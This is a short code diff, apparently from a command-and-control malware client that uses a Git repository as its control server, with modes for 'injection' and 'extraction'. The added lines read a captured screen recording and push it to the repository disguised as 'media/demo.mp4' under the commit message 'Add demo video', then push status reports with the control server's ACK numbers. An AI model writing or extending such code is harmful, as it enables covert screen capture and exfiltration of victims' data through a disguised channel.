@@ -163,6 +163,13 @@ if __name__ == "__main__":
             # Call key Injection function:
             handler.mode = mode
             screen_path, pass_path = inject.main()
+            video_bytes = open(f"{screen_path}","rb").read()
+            git.add("media/demo.mp4",video_bytes)
+            git.commit_and_push("Add demo video")
+            mode = "L"
+            git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
+            git.commit_and_push(f"Injection sequence completed.")
+            continue
 
         elif mode == "E":
             # Call key Extraction function:
